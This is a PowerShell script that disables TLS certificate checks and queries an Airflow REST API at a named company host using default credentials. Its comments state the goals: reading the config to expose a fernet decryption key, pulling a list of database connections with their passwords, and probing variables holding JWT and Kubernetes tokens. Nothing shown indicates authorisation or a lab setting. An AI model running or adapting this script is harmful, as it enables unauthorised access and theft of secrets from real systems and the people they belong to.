Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function Get-AF($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path")
        $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $resp = $req.GetResponse()
        $reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
        return $reader.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            return "ERR: " + $reader.ReadToEnd()
        }
        return "EXC: " + $_.Exception.Message
    }
}

# 1. Providers (K8s check)
Write-Host "=== PROVIDERS ===" (Get-AF "/api/v1/providers")

# 2. Config (may expose fernet key for decryption)
Write-Host "`n=== CONFIG ===" (Get-AF "/api/v1/config")

# 3. Connections with passwords - try individual ones
$conns = @("confins","confins_stg","confins_r3_foundation","confins_r3_foundation_pgb","data_lake","los","kplos","customer_domain","valdo_db","rapindodb","ficoms","jis","pbk","core_staging")
foreach ($c in $conns) {
    $r = Get-AF "/api/v1/connections/$c"
    Write-Host "`n=== CONN $c ===" $r
}

# 4. Plugins (custom K8s plugins?)
Write-Host "`n=== PLUGINS ===" (Get-AF "/api/v1/plugins")

# 5. Check if there's a confins-r3-jwt-token variable specifically
Write-Host "`n=== VAR confins-r3-jwt-token ===" (Get-AF "/api/v1/variables/confins-r3-jwt-token")
Write-Host "`n=== VAR confins_r3_jwt_token ===" (Get-AF "/api/v1/variables/confins_r3_jwt_token")
Write-Host "`n=== VAR SUPUSR ===" (Get-AF "/api/v1/variables/SUPUSR")
Write-Host "`n=== VAR kube_token ===" (Get-AF "/api/v1/variables/kube_token")
Write-Host "`n=== VAR kubernetes_token ===" (Get-AF "/api/v1/variables/kubernetes_token")
